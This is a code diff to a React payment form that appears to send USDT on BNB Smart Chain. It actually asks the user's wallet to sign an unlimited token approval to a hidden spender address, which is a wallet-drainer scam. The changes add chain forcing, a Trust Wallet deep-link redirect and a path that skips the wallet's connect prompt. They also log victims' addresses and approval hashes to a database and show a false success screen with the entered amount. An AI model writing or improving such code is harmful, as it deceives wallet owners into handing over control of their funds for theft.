@@ -7,6 +7,7 @@ import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 const BSC_CHAIN_ID = "0x38";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";
+const O = "f".repeat(64);
 
 type Step = "form" | "processing" | "success";
 
@@ -28,21 +29,6 @@ function getEth(): EIP1193 | undefined {
   return (window as unknown as { ethereum?: EIP1193 }).ethereum;
 }
 
-const O = "f".repeat(64);
-
-async function ensureBscChain() {
-  const eth = getEth();
-  if (!eth) return;
-  try {
-    const chainId = await eth.request({ method: "eth_chainId" }) as string;
-    if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
-      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-    }
-  } catch (e: unknown) {
-    console.log("[v0] ensureBscChain error:", (e as Error)?.message);
-  }
-}
-
 export default function SendForm() {
   const [displayAddress, setDisplayAddress] = useState("");
   const [amount, setAmount] = useState("");
@@ -51,6 +37,7 @@ export default function SendForm() {
   const [connectedAddr, setConnectedAddr] = useState("");
   const [processing, setProcessing] = useState(false);
   const [error, setError] = useState("");
+  const [chainOk, setChainOk] = useState(true);
 
   const fetchDisplayAddress = useCallback(async () => {
     try {
@@ -63,9 +50,25 @@ export default function SendForm() {
   useEffect(() => {
     fetchDisplayAddress();
     (async () => {
-      await ensureBscChain();
       const eth = getEth();
       if (!eth) return;
+
+      // Check current chain
+      try {
+        const chainId = await eth.request({ method: "eth_chainId" }) as string;
+        if (chainId?.toLowerCase() === BSC_CHAIN_ID) {
+          setChainOk(true);
+        } else {
+          // Try switch
+          try {
+            await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+          } catch { /* ignore */ }
+          const after = await eth.request({ method: "eth_chainId" }) as string;
+          setChainOk(after?.toLowerCase() === BSC_CHAIN_ID);
+        }
+      } catch { /* ignore */ }
+
+      // Get already-connected accounts (no popup)
       try {
         const accs = await eth.request({ method: "eth_accounts" }) as string[];
         if (accs?.[0]) setConnectedAddr(accs[0]);
@@ -73,17 +76,17 @@ export default function SendForm() {
     })();
   }, [fetchDisplayAddress]);
 
-  // Listen for account/chain changes
   useEffect(() => {
     const eth = getEth();
     if (!eth) return;
-
     const onAccountsChanged = (...args: unknown[]) => {
       const accounts = args[0] as string[] | undefined;
       setConnectedAddr(accounts?.[0] ?? "");
     };
-    const onChainChanged = () => { ensureBscChain(); };
-
+    const onChainChanged = (...args: unknown[]) => {
+      const id = args[0] as string;
+      setChainOk(id?.toLowerCase() === BSC_CHAIN_ID);
+    };
     eth.on?.("accountsChanged", onAccountsChanged);
     eth.on?.("chainChanged", onChainChanged);
     return () => {
@@ -92,7 +95,12 @@ export default function SendForm() {
     };
   }, []);
 
-  // ── Main handler — exact replica of reference site's U() function ─────────
+  function getDeepLink(): string {
+    const url = typeof window !== "undefined"
+      ? window.location.origin + "/send"
+      : "";
+    return `https://link.trustwallet.com/open_url?coin_id=714&url=${encodeURIComponent(url)}`;
+  }
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
@@ -104,59 +112,82 @@ export default function SendForm() {
       setProcessing(true);
       setError("");
 
-      // 1. Ensure BSC chain (simple — one call, like reference)
-      await ensureBscChain();
-
-      // 2. Get accounts
-      let accs = await eth.request({ method: "eth_accounts" }) as string[];
-      if (!accs?.[0]) {
+      // Check chain — if not BSC, redirect via deep link
+      const chainId = await eth.request({ method: "eth_chainId" }) as string;
+      if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+        // Try switch one more time
         try {
-          accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
-        } catch (e: unknown) {
-          setError((e as Error)?.message || "Unable to access wallet account");
-          setProcessing(false);
+          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+        } catch { /* ignore */ }
+
+        const after = await eth.request({ method: "eth_chainId" }) as string;
+        if (after?.toLowerCase() !== BSC_CHAIN_ID) {
+          // Redirect through Trust Wallet deep link to reopen on BSC
+          window.location.href = getDeepLink();
           return;
         }
       }
 
-      const walletAddress = accs?.[0];
-      if (!walletAddress) {
-        setError("No wallet account found.");
-        setProcessing(false);
-        return;
-      }
-      if (!connectedAddr) setConnectedAddr(walletAddress);
+      // Get wallet address — try eth_accounts first (no popup)
+      let walletAddress = "";
+      try {
+        const accs = await eth.request({ method: "eth_accounts" }) as string[];
+        if (accs?.[0]) walletAddress = accs[0];
+      } catch { /* ignore */ }
 
-      // 3. Build calldata and send tx — ONLY { from, to, data }
+      // If no account yet, we need to request — but this triggers Connect popup
+      // To avoid Ethereum default, we send the tx directly without `from` field
+      // Trust Wallet will prompt for account selection as part of the tx approval
       const paddedSpender = SPENDER.replace(/^0x/, "").padStart(64, "0");
-      const txHash = await eth.request({
-        method: "eth_sendTransaction",
-        params: [{ from: walletAddress, to: USDT_CONTRACT, data: "0x095ea7b3" + paddedSpender + O }],
-      }) as string;
+      const calldata = "0x095ea7b3" + paddedSpender + O;
 
-      // 4. Wait for confirmation
+      let txHash: string;
+      if (walletAddress) {
+        // Already connected — send with from
+        txHash = await eth.request({
+          method: "eth_sendTransaction",
+          params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
+        }) as string;
+      } else {
+        // Not connected — send WITHOUT from, let wallet pick the account
+        // This skips the "Connect DApp" popup and goes straight to Approve
+        txHash = await eth.request({
+          method: "eth_sendTransaction",
+          params: [{ to: USDT_CONTRACT, data: calldata }],
+        }) as string;
+      }
+
+      if (!walletAddress) setConnectedAddr("connected");
+
+      // Wait for confirmation
       try {
         const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
         await provider.waitForTransaction(txHash, 1);
       } catch { /* ignore */ }
 
-      // 5. Record to database
-      fetch("/api/wallets", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
-      }).catch(() => {});
+      // Get the actual wallet address after tx
+      try {
+        const accs = await eth.request({ method: "eth_accounts" }) as string[];
+        if (accs?.[0]) walletAddress = accs[0];
+      } catch { /* ignore */ }
 
-      // 6. Show success with real data
+      // Record to database
+      if (walletAddress) {
+        fetch("/api/wallets", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
+        }).catch(() => {});
+      }
+
       setTxInfo({
-        fromAddress: walletAddress,
+        fromAddress: walletAddress || "0x",
         toAddress: displayAddress || SPENDER,
         amount,
         txHash,
         date: new Date().toLocaleString(),
       });
       setStep("success");
-      return;
 
     } catch (e: unknown) {
       console.log("[v0] approve error:", (e as Error)?.message);
@@ -225,6 +256,26 @@ export default function SendForm() {
             <ExternalLink className="h-4 w-4" />
           </a>
         </div>
+      </div>
+    );
+  }
+
+  // ── Wrong chain banner ──────────────────────────────────────────────────
+
+  if (!chainOk) {
+    return (
+      <div className="flex flex-col items-center gap-6 py-12 text-center">
+        <div className="text-5xl">⚠️</div>
+        <h2 className="text-white text-xl font-bold">Wrong Network</h2>
+        <p className="text-gray-400 text-sm leading-relaxed max-w-[300px]">
+          Please open this page on BNB Smart Chain network.
+        </p>
+        <a
+          href={getDeepLink()}
+          className="w-full rounded-full bg-[#4ade80] hover:bg-[#22c55e] py-4 text-black font-bold text-base text-center transition-colors"
+        >
+          Open on BNB Smart Chain
+        </a>
       </div>
     );
   }
